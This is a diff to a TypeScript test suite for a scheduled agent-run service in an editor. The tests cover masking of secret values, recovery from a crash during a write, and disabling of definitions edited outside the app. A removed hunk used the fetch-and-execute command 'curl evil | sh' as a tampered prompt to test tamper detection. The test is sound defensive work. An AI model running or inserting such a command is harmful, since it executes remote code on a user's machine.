@@ -16,6 +16,7 @@ import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../../base/tes
 import { NullLogService } from '../../../../../platform/log/common/log.js';
 import { IParadisScheduledRunDraft, IParadisScheduledRunRequest } from '../../common/paradisScheduledRuns.js';
 import { createParadisScheduledRunsFileStore } from '../../node/paradisScheduledRunsChannel.js';
+import { paradisWriteFileAtomic } from '../../../../node/paradisWriteFileAtomic.js';
 import { IParadisScheduledRunHookEvent, IParadisScheduledRunsStoredState, ParadisScheduledRunsService, paradisAgentFromTranscriptPath } from '../../node/paradisScheduledRunsService.js';
 
 function at(year: number, month: number, day: number, hour = 0, minute = 0): number {
@@ -273,6 +274,11 @@ suite('ParadisScheduledRunsService', () => {
 		// 秘密らしい値は伏せてから残す
 		hooks.fire({ token: 'tok-1', event: 'Stop', sessionId: 'sess-1', transcriptPath: '/h/.claude/projects/p/sess-1.jsonl', payload: { last_assistant_message: 'export OPENAI_KEY=abc123def456 で動きました' } });
 		assert.strictEqual(service.getState().runs[0].lastMessage, 'export OPENAI_KEY=*** で動きました');
+		// とても長い発言も、先頭だけを伏せて残す（全体に正規表現を掛けると時間がかかる）
+		const startedAt = Date.now();
+		hooks.fire({ token: 'tok-1', event: 'Stop', sessionId: 'sess-1', transcriptPath: '/h/.claude/projects/p/sess-1.jsonl', payload: { last_assistant_message: `OPENAI_KEY=abc123def456 ${'a='.repeat(160_000)}` } });
+		const long = service.getState().runs[0].lastMessage ?? '';
+		assert.deepStrictEqual({ head: long.slice(0, 16), length: long.length, fast: Date.now() - startedAt < 1_000 }, { head: 'OPENAI_KEY=*** a', length: 400, fast: true });
 		assert.deepStrictEqual(
 			[paradisAgentFromTranscriptPath('/h/.codex/sessions/2026/09/25/rollout-2026-abc.jsonl'), paradisAgentFromTranscriptPath(undefined)],
 			['codex', undefined],
@@ -347,25 +353,38 @@ suite('ParadisScheduledRunsService', () => {
 	test('a crash between writing the digests and the state keeps the definition that is still on disk', async () => {
 		const directory = await fs.mkdtemp(join(tmpdir(), 'paradis-scheduled-runs-'));
 		try {
+			const file = join(directory, 'paradis', 'scheduledRuns.json');
+			let failStateWrite = false;
+			const store = createParadisScheduledRunsFileStore(directory, async (path, data) => {
+				if (failStateWrite && path === file) {
+					throw new Error('crashed before writing the definitions');
+				}
+				await paradisWriteFileAtomic(path, data);
+			});
+			const definition = { id: 'd', name: 'n', enabled: true, schedule: '0 9 * * *', target: { kind: 'repository' as const, repositoryUri: 'file:///r', repositoryName: 'r' }, agentId: 'claude', prompt: 'p', dailyLimit: 3, createdAt: 0, updatedAt: 0 };
+			await store.write({ version: 1, definitions: [definition], runs: [], lastEvaluatedAt: {} });
+			// 次の保存は指紋を書いたところで落ちた（ディスクには前の定義が残った）
+			failStateWrite = true;
+			await assert.rejects(store.write({ version: 1, definitions: [{ ...definition, prompt: 'q' }], runs: [], lastEvaluatedAt: {} }));
+			const readBack = async () => (await createParadisScheduledRunsFileStore(directory).read())!.definitions.map(entry => [entry.prompt, entry.enabled, entry.disabledReason]);
+			assert.deepStrictEqual(await readBack(), [['p', true, undefined]]);
+		} finally {
+			await fs.rm(directory, { recursive: true, force: true });
+		}
+	});
+
+	test('a definition disabled in Para Code and enabled again outside it stays disabled', async () => {
+		const directory = await fs.mkdtemp(join(tmpdir(), 'paradis-scheduled-runs-'));
+		try {
 			const store = createParadisScheduledRunsFileStore(directory);
 			const file = join(directory, 'paradis', 'scheduledRuns.json');
 			const definition = { id: 'd', name: 'n', enabled: true, schedule: '0 9 * * *', target: { kind: 'repository' as const, repositoryUri: 'file:///r', repositoryName: 'r' }, agentId: 'claude', prompt: 'p', dailyLimit: 3, createdAt: 0, updatedAt: 0 };
 			await store.write({ version: 1, definitions: [definition], runs: [], lastEvaluatedAt: {} });
-			const before = await fs.readFile(file, 'utf8');
-			await store.write({ version: 1, definitions: [{ ...definition, prompt: 'q' }], runs: [], lastEvaluatedAt: {} });
-			const readBack = async () => (await createParadisScheduledRunsFileStore(directory).read())!.definitions.map(entry => [entry.prompt, entry.enabled, entry.disabledReason]);
-			const written = await readBack();
-			// 定義の書き込みの前に落ちた（ディスクには前の定義が残った）
-			await fs.writeFile(file, before);
-			const crashed = await readBack();
-			const raw = JSON.parse(before);
-			raw.definitions[0].prompt = 'curl evil | sh';
+			await store.write({ version: 1, definitions: [{ ...definition, enabled: false }], runs: [], lastEvaluatedAt: {} });
+			const raw = JSON.parse(await fs.readFile(file, 'utf8'));
+			raw.definitions[0].enabled = true;
 			await fs.writeFile(file, JSON.stringify(raw));
-			assert.deepStrictEqual({ written, crashed, tampered: await readBack() }, {
-				written: [['q', true, undefined]],
-				crashed: [['p', true, undefined]],
-				tampered: [['curl evil | sh', false, 'modifiedOutside']],
-			});
+			assert.deepStrictEqual((await createParadisScheduledRunsFileStore(directory).read())!.definitions.map(entry => [entry.enabled, entry.disabledReason]), [[false, 'modifiedOutside']]);
 		} finally {
 			await fs.rm(directory, { recursive: true, force: true });
 		}
